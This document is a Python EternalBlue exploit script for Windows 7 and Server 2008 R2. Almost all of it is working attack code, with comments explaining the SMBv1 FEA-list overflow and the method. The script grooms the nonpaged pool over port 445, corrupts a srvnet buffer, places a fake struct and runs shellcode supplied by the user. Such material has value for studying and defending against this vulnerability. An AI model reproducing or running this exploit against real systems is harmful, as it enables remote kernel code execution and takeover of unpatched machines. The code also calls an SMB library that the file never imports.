#!/usr/bin/python
from struct import pack
import os
import sys
import socket

'''
EternalBlue exploit for Windows 7/2008 by sleepya
The exploit might FAIL and CRASH a target system (depended on what is overwritten)

Tested on:
- Windows 7 SP1 x64
- Windows 2008 R2 x64

Reference:
- http://blogs.360.cn/360safe/2017/04/17/nsa-eternalblue-smb/


Bug detail:
- For the bug detail, please see http://blogs.360.cn/360safe/2017/04/17/nsa-eternalblue-smb/
- You can see SrvOs2FeaListToNt(), SrvOs2FeaListSizeToNt() and SrvOs2FeaToNt() functions logic from WinNT4 source code
    https://github.com/Safe3/WinNT4/blob/master/private/ntos/srv/ea.c#L263
- In vulnerable SrvOs2FeaListSizeToNt() function, there is a important change from WinNT4 in for loop. The psuedo code is here.
    if (nextFea > lastFeaStartLocation) {
      // this code is for shrinking FeaList->cbList because last fea is invalid.
      // FeaList->cbList is DWORD but it is cast to WORD.
      *(WORD *)FeaList = (BYTE*)fea - (BYTE*)FeaList;
      return size;
    }
- Here is related struct info.
#####
typedef struct _FEA {   /* fea */
	BYTE fEA;        /* flags                              */
	BYTE cbName;     /* name length not including NULL */
	USHORT cbValue;  /* value length */
} FEA, *PFEA;

typedef struct _FEALIST {    /* feal */
	DWORD cbList;   /* total bytes of structure including full list */
	FEA list[1];    /* variable length FEA structures */
} FEALIST, *PFEALIST;

typedef struct _FILE_FULL_EA_INFORMATION {
  ULONG  NextEntryOffset;
  UCHAR  Flags;
  UCHAR  EaNameLength;
  USHORT EaValueLength;
  CHAR   EaName[1];
} FILE_FULL_EA_INFORMATION, *PFILE_FULL_EA_INFORMATION;
######


Exploit info:
- I do not reverse engineer any x86 binary so I do not know about exact offset.
- The exploit use heap of HAL (address 0xffffffffffd00010 on x64) for placing fake struct and shellcode.
  This memory page is executable on Windows 7 and Wndows 2008.
- The important part of feaList and fakeStruct is copied from NSA exploit which works on both x86 and x64.
- The exploit trick is same as NSA exploit
- The overflow is happened on nonpaged pool so we need to massage target nonpaged pool.
- If exploit failed but target does not crash, try increasing 'numGroomConn' value (at least 5)
- See the code and comment for exploit detail.


srvnet buffer info:
- srvnet buffer contains a pointer to another struct and MDL about received buffer
  - Controlling MDL values results in arbitrary write
  - Controlling pointer to fake struct results in code execution because there is pointer to function
- A srvnet buffer is created after target receiving first 4 bytes
  - First 4 bytes contains length of SMB message
  - The possible srvnet buffer size is "..., 0x8???, 0x11000, 0x21000, ...". srvnet.sys will select the size that big enough.
- After receiving whole SMB message or connection lost, server call SrvNetWskReceiveComplete() to handle SMB message
- SrvNetWskReceiveComplete() check and set some value then pass SMB message to SrvNetCommonReceiveHandler()
- SrvNetCommonReceiveHandler() passes SMB message to SMB handler
  - If a pointer in srvnet buffer is modified to fake struct, we can make SrvNetCommonReceiveHandler() call our shellcode
  - If SrvNetCommonReceiveHandler() call our shellcode, no SMB handler is called
  - Normally, SMB handler free the srvnet buffer when done but our shellcode dose not. So memory leak happen.
  - Memory leak is ok to be ignored
'''

# wanted overflown buffer size (this exploit support only 0x10000 and 0x11000)
# the size 0x10000 is easier to debug when setting breakpoint in SrvOs2FeaToNt() because it is called only 2 time
# the size 0x11000 is used in nsa exploit. this size is more reliable.
NTFEA_SIZE = 0x11000
# the NTFEA_SIZE above is page size. We need to use most of last page preventing any data at the end of last page

ntfea10000 = pack('<BBH', 0, 0, 0xffdd) + 'A'*0xffde

ntfea11000 = (pack('<BBH', 0, 0, 0) + '\x00')*600  # with these fea, ntfea size is 0x1c20
ntfea11000 += pack('<BBH', 0, 0, 0xf3bd) + 'A'*0xf3be  # 0x10fe8 - 0x1c20 - 0xc = 0xf3bc

ntfea1f000 = (pack('<BBH', 0, 0, 0) + '\x00')*0x2494  # with these fea, ntfea size is 0x1b6f0
ntfea1f000 += pack('<BBH', 0, 0, 0x48ed) + 'A'*0x48ee  # 0x1ffe8 - 0x1b6f0 - 0xc = 0x48ec

ntfea = { 0x10000 : ntfea10000, 0x11000 : ntfea11000 }

'''
Reverse from srvnet.sys (Win7 x64)
- SrvNetAllocateNonPagedBufferInternal() and SrvNetWskReceiveComplete():

// for x64
struct SRVNET_BUFFER {
	// offset from POOLHDR: 0x10
	USHORT flag;
	char pad[2];
	char unknown0[12];
	// offset from SRVNET_POOLHDR: 0x20
	LIST_ENTRY list;
	// offset from SRVNET_POOLHDR: 0x30
	char *pnetBuffer;
	DWORD netbufSize;  // size of netBuffer
	DWORD ioStatusInfo;  // copy value of IRP.IOStatus.Information
	// offset from SRVNET_POOLHDR: 0x40
	MDL *pMdl1; // at offset 0x70
	DWORD nByteProcessed;
	DWORD pad3;
	// offset from SRVNET_POOLHDR: 0x50
	DWORD nbssSize;  // size of this smb packet (from user)
	DWORD pad4;
	QWORD pSrvNetWekStruct;  // want to change to fake struct address
	// offset from SRVNET_POOLHDR: 0x60
	MDL *pMdl2;
	QWORD unknown5;
	// offset from SRVNET_POOLHDR: 0x70
	// MDL mdl1;  // for this srvnetBuffer (so its pointer is srvnetBuffer address)
	// MDL mdl2;
	// char transportHeader[0x50];  // 0x50 is TRANSPORT_HEADER_SIZE
	// char netBuffer[0];
};

struct SRVNET_POOLHDR {
	DWORD size;
	char unknown[12];
	SRVNET_BUFFER hdr;
};
'''
# Most field in overwritten (corrupted) srvnet struct can be any value because it will be left without free (memory leak) after processing
# Here is the important fields on x64
# - offset 0x58 (VOID*) : pointer to a struct contained pointer to function. the pointer to function is called when done receiving SMB request.
#                           The value MUST point to valid (might be fake) struct.
# - offset 0x70 (MDL)   : MDL for describe receiving SMB request buffer
#   - 0x70 (VOID*)    : MDL.Next should be NULL
#   - 0x78 (USHORT)   : MDL.Size should be some value that not too small
#   - 0x7a (USHORT)   : MDL.MdlFlags should be 0x1004 (MDL_NETWORK_HEADER|MDL_SOURCE_IS_NONPAGED_POOL)
#   - 0x80 (VOID*)    : MDL.Process should be NULL
#   - 0x88 (VOID*)    : MDL.MappedSystemVa MUST be a received network buffer address. Controlling this value get arbitrary write.
#                         The address for arbitrary write MUST be subtracted by a number of sent bytes (0x80 in this exploit).
#                         
#
# To free the corrupted srvnet buffer, shellcode MUST modify some memory value to satisfy condition.
# Here is related field for freeing corrupted buffer
# - offset 0x10 (USHORT): be 0xffff to make SrvNetFreeBuffer() really free the buffer (else buffer is pushed to srvnet lookaside)
#                           a corrupted buffer MUST not be reused.
# - offset 0x48 (DWORD) : be a number of total byte received. This field MUST be set by shellcode because SrvNetWskReceiveComplete() set it to 0
#                           before calling SrvNetCommonReceiveHandler(). This is possible because pointer to SRVNET_BUFFER struct is passed to
#                           your shellcode as function argument
# - offset 0x60 (PMDL)  : points to any fake MDL with MDL.Flags 0x20 does not set
# The last condition is your shellcode MUST return non-negative value. The easiest way to do is "xor eax,eax" before "ret".
# Here is x64 assembly code for setting nByteProcessed field
# - fetch SRVNET_BUFFER address from function argument
#     \x48\x8b\x54\x24\x40  mov rdx, [rsp+0x40]
# - set nByteProcessed for trigger free after return
#     \x8b\x4a\x2c          mov ecx, [rdx+0x2c]
#     \x89\x4a\x38          mov [rdx+0x38], ecx

TARGET_HAL_HEAP_ADDR_x64 = 0xffffffffffd00010
TARGET_HAL_HEAP_ADDR_x86 = 0xffdff000

fakeSrvNetBufferNsa = pack('<II', 0x11000, 0)*2
fakeSrvNetBufferNsa += pack('<HHI', 0xffff, 0, 0)*2
fakeSrvNetBufferNsa += '\x00'*16
fakeSrvNetBufferNsa += pack('<IIII', TARGET_HAL_HEAP_ADDR_x86+0x100, 0, 0, TARGET_HAL_HEAP_ADDR_x86+0x20)
fakeSrvNetBufferNsa += pack('<IIHHI', TARGET_HAL_HEAP_ADDR_x86+0x100, 0xffffffff, 0x60, 0x1004, 0)  # _, x86 MDL.Next, .Size, .MdlFlags, .Process
fakeSrvNetBufferNsa += pack('<IIQ', TARGET_HAL_HEAP_ADDR_x86-0x80, 0, TARGET_HAL_HEAP_ADDR_x64)  # x86 MDL.MappedSystemVa, _, x64 pointer to fake struct
fakeSrvNetBufferNsa += pack('<QQ', TARGET_HAL_HEAP_ADDR_x64+0x100, 0)  # x64 pmdl2
# below 0x20 bytes is overwritting MDL
# NSA exploit overwrite StartVa, ByteCount, ByteOffset fields but I think no need because ByteCount is always big enough
fakeSrvNetBufferNsa += pack('<QHHI', 0, 0x60, 0x1004, 0)  # MDL.Next, MDL.Size, MDL.MdlFlags
fakeSrvNetBufferNsa += pack('<QQ', 0, TARGET_HAL_HEAP_ADDR_x64-0x80)  # MDL.Process, MDL.MappedSystemVa

# below is for targeting x64 only (all x86 related values are set to 0)
# this is for show what fields need to be modified
fakeSrvNetBufferX64 = pack('<II', 0x11000, 0)*2
fakeSrvNetBufferX64 += pack('<HHIQ', 0xffff, 0, 0, 0)
fakeSrvNetBufferX64 += '\x00'*16
fakeSrvNetBufferX64 += '\x00'*16
fakeSrvNetBufferX64 += '\x00'*16  # 0x40
fakeSrvNetBufferX64 += pack('<IIQ', 0, 0, TARGET_HAL_HEAP_ADDR_x64)  # _, _, pointer to fake struct
fakeSrvNetBufferX64 += pack('<QQ', TARGET_HAL_HEAP_ADDR_x64+0x100, 0)  # pmdl2
fakeSrvNetBufferX64 += pack('<QHHI', 0, 0x60, 0x1004, 0)  # MDL.Next, MDL.Size, MDL.MdlFlags
fakeSrvNetBufferX64 += pack('<QQ', 0, TARGET_HAL_HEAP_ADDR_x64-0x80)  # MDL.Process, MDL.MappedSystemVa


fakeSrvNetBuffer = fakeSrvNetBufferNsa
#fakeSrvNetBuffer = fakeSrvNetBufferX64

feaList = pack('<I', 0x10000)  # the max value of feaList size is 0x10000 (the only value that can trigger bug)
feaList += ntfea[NTFEA_SIZE]
# Note:
# - SMB1 data buffer header is 16 bytes and 8 bytes on x64 and x86 respectively
#   - x64: below fea will be copy to offset 0x11000 of overflow buffer
#   - x86: below fea will be copy to offset 0x10ff8 of overflow buffer
feaList += pack('<BBH', 0, 0, len(fakeSrvNetBuffer)-1) + fakeSrvNetBuffer # -1 because first '\x00' is for name
# stop copying by invalid flag (can be any value except 0 and 0x80)
feaList += pack('<BBH', 0x12, 0x34, 0x5678)


# fake struct for SrvNetWskReceiveComplete() and SrvNetCommonReceiveHandler()
# x64: fake struct is at ffffffff ffd00010
#   offset 0xa0:  LIST_ENTRY must be valid address. cannot be NULL.
#   offset 0x08:  set to 3 (DWORD) for invoking ptr to function
#   offset 0x1d0: KSPIN_LOCK
#   offset 0x1d8: array of pointer to function
#
# code path to get code exection after this struct is controlled
# SrvNetWskReceiveComplete() -> SrvNetCommonReceiveHandler() -> call fn_ptr
fake_recv_struct = pack('<QII', 0, 3, 0)
fake_recv_struct += '\x00'*16
fake_recv_struct += pack('<QII', 0, 3, 0)
fake_recv_struct += ('\x00'*16)*7
fake_recv_struct += pack('<QQ', TARGET_HAL_HEAP_ADDR_x64+0xa0, TARGET_HAL_HEAP_ADDR_x64+0xa0)  # offset 0xa0 (LIST_ENTRY to itself)
fake_recv_struct += '\x00'*16
fake_recv_struct += pack('<IIQ', TARGET_HAL_HEAP_ADDR_x86+0xc0, TARGET_HAL_HEAP_ADDR_x86+0xc0, 0)  # x86 LIST_ENTRY
fake_recv_struct += ('\x00'*16)*11
fake_recv_struct += pack('<QII', 0, 0, TARGET_HAL_HEAP_ADDR_x86+0x190)  # fn_ptr array on x86
fake_recv_struct += pack('<IIQ', 0, TARGET_HAL_HEAP_ADDR_x86+0x1f0-1, 0)  # x86 shellcode address
fake_recv_struct += ('\x00'*16)*3
fake_recv_struct += pack('<QQ', 0, TARGET_HAL_HEAP_ADDR_x64+0x1e0)  # offset 0x1d0: KSPINLOCK, fn_ptr array
fake_recv_struct += pack('<QQ', 0, TARGET_HAL_HEAP_ADDR_x64+0x1f0-1)  # x64 shellcode address - 1 (this value will be increment by one)


def getNTStatus(self):
	return (self['ErrorCode'] << 16) | (self['_reserved'] << 8) | self['ErrorClass']

def sendEcho(conn, tid, data):
	pkt = smb.NewSMBPacket()
	pkt['Tid'] = tid

	transCommand = smb.SMBCommand(smb.SMB.SMB_COM_ECHO)
	transCommand['Parameters'] = smb.SMBEcho_Parameters()
	transCommand['Data'] = smb.SMBEcho_Data()

	transCommand['Parameters']['EchoCount'] = 1
	transCommand['Data']['Data'] = data
	pkt.addCommand(transCommand)

	conn.sendSMB(pkt)
	recvPkt = conn.recvSMB()
	if recvPkt.getNTStatus() == 0:
		print('got good ECHO response')
	else:
		print('got bad ECHO response: 0x{:x}'.format(recvPkt.getNTStatus()))


# do not know why Word Count can be 12
# if word count is not 12, setting ByteCount without enough data will be failed
class SMBSessionSetupAndXCustom_Parameters:
	structure = (
		('MaxBuffer','<H'),
		('MaxMpxCount','<H'),
		('VCNumber','<H'),
		('SessionKey','<L'),
		#('AnsiPwdLength','<H'),
		('UnicodePwdLength','<H'),
		('_reserved','<L=0'),
		('Capabilities','<L'),
	)

def createSessionAllocNonPaged(target, size):
	# The big nonpaged pool allocation is in BlockingSessionSetupAndX() function
	# You can see the allocation logic (even code is not the same) in WinNT4 source code 
	# https://github.com/Safe3/WinNT4/blob/master/private/ntos/srv/smbadmin.c#L1050 till line 1071
	conn = smb.SMB(target, target)
	_, flags2 = conn.get_flags()
	# FLAGS2_EXTENDED_SECURITY MUST not be set
	flags2 &= ~smb.SMB.FLAGS2_EXTENDED_SECURITY
	# if not use unicode, buffer size on target machine is doubled because converting ascii to utf16
	if size >= 0xffff:
		flags2 &= ~smb.SMB.FLAGS2_UNICODE
		reqSize = size // 2
	else:
		flags2 |= smb.SMB.FLAGS2_UNICODE
		reqSize = size
	conn.set_flags(flags2=flags2)
	
	pkt = smb.NewSMBPacket()

	sessionSetup = smb.SMBCommand(smb.SMB.SMB_COM_SESSION_SETUP_ANDX)
	sessionSetup['Parameters'] = SMBSessionSetupAndXCustom_Parameters()

	sessionSetup['Parameters']['MaxBuffer']        = 61440  # can be any value greater than response size
	sessionSetup['Parameters']['MaxMpxCount']      = 2  # can by any value
	sessionSetup['Parameters']['VCNumber']         = os.getpid()
	sessionSetup['Parameters']['SessionKey']       = 0
	sessionSetup['Parameters']['AnsiPwdLength']    = 0
	sessionSetup['Parameters']['UnicodePwdLength'] = 0
	sessionSetup['Parameters']['Capabilities']     = 0x80000000

	# set ByteCount here
	sessionSetup['Data'] = pack('<H', reqSize) + '\x00'*20
	pkt.addCommand(sessionSetup)

	conn.sendSMB(pkt)
	recvPkt = conn.recvSMB()
	if recvPkt.getNTStatus() == 0:
		print('SMB1 session setup allocate nonpaged pool success')
	else:
		print('SMB1 session setup allocate nonpaged pool failed')
	return conn


# Note: impacket-0.9.15 struct has no ParameterDisplacement
############# SMB_COM_TRANSACTION2_SECONDARY (0x33)
class SMBTransaction2Secondary_Parameters_Fixed:
    structure = (
        ('TotalParameterCount','<H=0'),
        ('TotalDataCount','<H'),
        ('ParameterCount','<H=0'),
        ('ParameterOffset','<H=0'),
        ('ParameterDisplacement','<H=0'),
        ('DataCount','<H'),
        ('DataOffset','<H'),
        ('DataDisplacement','<H=0'),
        ('FID','<H=0'),
    )

def send_trans2_second(conn, tid, data, displacement):
	pkt = smb.NewSMBPacket()
	pkt['Tid'] = tid

	# assume no params

	transCommand = smb.SMBCommand(smb.SMB.SMB_COM_TRANSACTION2_SECONDARY)
	transCommand['Parameters'] = SMBTransaction2Secondary_Parameters_Fixed()
	transCommand['Data'] = smb.SMBTransaction2Secondary_Data()

	transCommand['Parameters']['TotalParameterCount'] = 0
	transCommand['Parameters']['TotalDataCount'] = len(data)

	fixedOffset = 32+3+18
	transCommand['Data']['Pad1'] = ''

	transCommand['Parameters']['ParameterCount'] = 0
	transCommand['Parameters']['ParameterOffset'] = 0

	if len(data) > 0:
		pad2Len = (4 - fixedOffset % 4) % 4
		transCommand['Data']['Pad2'] = '\xFF' * pad2Len
	else:
		transCommand['Data']['Pad2'] = ''
		pad2Len = 0

	transCommand['Parameters']['DataCount'] = len(data)
	transCommand['Parameters']['DataOffset'] = fixedOffset + pad2Len
	transCommand['Parameters']['DataDisplacement'] = displacement

	transCommand['Data']['Trans_Parameters'] = ''
	transCommand['Data']['Trans_Data'] = data
	pkt.addCommand(transCommand)

	conn.sendSMB(pkt)


def send_nt_trans(conn, tid, setup, data, param, firstDataFragmentSize, sendLastChunk=True):
	pkt = smb.NewSMBPacket()
	pkt['Tid'] = tid

	command = pack('<H', setup)

	transCommand = smb.SMBCommand(smb.SMB.SMB_COM_NT_TRANSACT)
	transCommand['Parameters'] = smb.SMBNTTransaction_Parameters()
	transCommand['Parameters']['MaxSetupCount'] = 1
	transCommand['Parameters']['MaxParameterCount'] = len(param)
	transCommand['Parameters']['MaxDataCount'] = 0
	transCommand['Data'] = smb.SMBTransaction2_Data()

	transCommand['Parameters']['Setup'] = command
	transCommand['Parameters']['TotalParameterCount'] = len(param)
	transCommand['Parameters']['TotalDataCount'] = len(data)

	fixedOffset = 32+3+38 + len(command)
	if len(param) > 0:
		padLen = (4 - fixedOffset % 4 ) % 4
		padBytes = '\xFF' * padLen
		transCommand['Data']['Pad1'] = padBytes
	else:
		transCommand['Data']['Pad1'] = ''
		padLen = 0

	transCommand['Parameters']['ParameterCount'] = len(param)
	transCommand['Parameters']['ParameterOffset'] = fixedOffset + padLen

	if len(data) > 0:
		pad2Len = (4 - (fixedOffset + padLen + len(param)) % 4) % 4
		transCommand['Data']['Pad2'] = '\xFF' * pad2Len
	else:
		transCommand['Data']['Pad2'] = ''
		pad2Len = 0

	transCommand['Parameters']['DataCount'] = firstDataFragmentSize
	transCommand['Parameters']['DataOffset'] = transCommand['Parameters']['ParameterOffset'] + len(param) + pad2Len

	transCommand['Data']['Trans_Parameters'] = param
	transCommand['Data']['Trans_Data'] = data[:firstDataFragmentSize]
	pkt.addCommand(transCommand)

	conn.sendSMB(pkt)
	conn.recvSMB() # must be success
	
	i = firstDataFragmentSize
	while i < len(data):
		sendSize = min(4096, len(data) - i)
		if len(data) - i <= 4096:
			if not sendLastChunk:
				break
		send_trans2_second(conn, tid, data[i:i+sendSize], i)
		i += sendSize
	
	if sendLastChunk:
		conn.recvSMB()
	return i

	
# connect to target and send a large nbss size with data 0x80 bytes
# this method is for allocating big nonpaged pool (no need to be same size as overflow buffer) on target
# a nonpaged pool is allocated by srvnet.sys that started by useful struct (especially after overwritten)
def createConnectionWithBigSMBFirst80(target):
	# https://msdn.microsoft.com/en-us/library/cc246496.aspx
	# Above link is about SMB2, but the important here is first 4 bytes.
	# If using wireshark, you will see the StreamProtocolLength is NBSS length.
	# The first 4 bytes is same for all SMB version. It is used for determine the SMB message length.
	#
	# After received first 4 bytes, srvnet.sys allocate nonpaged pool for receving SMB message.
	# srvnet.sys forwards this buffer to SMB message handler after receiving all SMB message.
	# Note: For Windows 7 and Windows 2008, srvnet.sys also forwards the SMB message to its handler when connection lost too.
	sk = socket.create_connection((target, 445))
	# For this exploit, use size is 0x11000
	pkt = '\x00' + '\x00' + pack('>H', 0xfff7)
	# There is no need to be SMB2 because we got code execution by corrupted srvnet buffer.
	# Also this is invalid SMB2 message.
	# I believe NSA exploit use SMB2 for hiding alert from IDS
	#pkt += '\xffSMB' # smb2
	# it can be anything even it is invalid
	pkt += 'BAAD' # can be any
	pkt += '\x00'*0x7c
	sk.send(pkt)
	return sk


def exploit(target, shellcode, numGroomConn):
	# force using smb.SMB for SMB1
	conn = smb.SMB(target, target)

	# can use conn.login() for ntlmv2
	conn.login_standard('', '')
	server_os = conn.get_server_os()
	print('Target OS: '+server_os)
	if not (server_os.startswith("Windows 7 ") or server_os.startswith("Windows Server 2008 ")):
		print('This exploit does not support this target')
		sys.exit()
	

	tid = conn.tree_connect_andx('\\\\'+target+'\\'+'IPC$')

	# Here is code path in WinNT4 (all reference files are relative path to https://github.com/Safe3/WinNT4/blob/master/private/ntos/srv/)
	# - SrvSmbNtTransaction() (smbtrans.c#L2677)
	#   - When all data is received, call ExecuteTransaction() at (smbtrans.c#L3113)
	# - ExecuteTransaction() (smbtrans.c#L82)
	#   - Call dispatch table (smbtrans.c#L347)
	#   - Dispatch table is defined at srvdata.c#L972 (target is command 0, SrvSmbOpen2() function)
	# - SrvSmbOpen2() (smbopen.c#L1002)
	#   - call SrvOs2FeaListToNt() (smbopen.c#L1095)
	
	# https://msdn.microsoft.com/en-us/library/ee441720.aspx
	# Send special feaList to a target except last fragment with SMB_COM_NT_TRANSACT and SMB_COM_TRANSACTION2_SECONDARY command
	# Note: cannot use SMB_COM_TRANSACTION2 for the exploit because the TotalDataCount field is USHORT
	# Note: transaction max data count is 66512 (0x103d0) and DataDisplacement is USHORT
	progress = send_nt_trans(conn, tid, 0, feaList, '\x00'*30, 2000, False)
	# we have to know what size of NtFeaList will be created when last fragment is sent

	# make sure server recv all payload before starting allocate big NonPaged
	#sendEcho(conn, tid, 'a'*12)

	# create buffer size NTFEA_SIZE-0x1000 at server
	# this buffer MUST NOT be big enough for overflown buffer
	allocConn = createSessionAllocNonPaged(target, NTFEA_SIZE - 0x1010)
	
	# groom nonpaged pool
	# when many big nonpaged pool are allocated, allocate another big nonpaged pool should be next to the last one
	srvnetConn = []
	for i in range(numGroomConn):
		sk = createConnectionWithBigSMBFirst80(target)
		srvnetConn.append(sk)

	# create buffer size NTFEA_SIZE at server
	# this buffer will be replaced by overflown buffer
	holeConn = createSessionAllocNonPaged(target, NTFEA_SIZE - 0x10)
	# disconnect allocConn to free buffer
	# expect small nonpaged pool allocation is not allocated next to holeConn because of this free buffer
	allocConn.get_socket().close()

	# hope one of srvnetConn is next to holeConn
	for i in range(5):
		sk = createConnectionWithBigSMBFirst80(target)
		srvnetConn.append(sk)
		
	# send echo again, all new 5 srvnet buffers should be created
	#sendEcho(conn, tid, 'a'*12)
	
	# remove holeConn to create hole for fea buffer
	holeConn.get_socket().close()

	# send last fragment to create buffer in hole and OOB write one of srvnetConn struct header
	send_trans2_second(conn, tid, feaList[progress:], progress)
	recvPkt = conn.recvSMB()
	retStatus = recvPkt.getNTStatus()
	# retStatus MUST be 0xc000000d (INVALID_PARAMETER) because of invalid fea flag
	if retStatus == 0xc000000d:
		print('good response status: INVALID_PARAMETER')
	else:
		print('bad response status: 0x{:08x}'.format(retStatus))
		

	# one of srvnetConn struct header should be modified
	# a corrupted buffer will write recv data in designed memory address
	for sk in srvnetConn:
		sk.send(fake_recv_struct + shellcode)

	# execute shellcode by closing srvnet connection
	for sk in srvnetConn:
		sk.close()

	# nicely close connection (no need for exploit)
	conn.disconnect_tree(tid)
	conn.logoff()
	conn.get_socket().close()


if len(sys.argv) < 3:
	print("{} <ip> <shellcode_file> [numGroomConn]".format(sys.argv[0]))
	sys.exit(1)

TARGET=sys.argv[1]
numGroomConn = 13 if len(sys.argv) < 4 else int(sys.argv[3])

fp = open(sys.argv[2], 'rb')
sc = fp.read()
fp.close()

print('shellcode size: {:d}'.format(len(sc)))
print('numGroomConn: {:d}'.format(numGroomConn))

exploit(TARGET, sc, numGroomConn)
print('done')
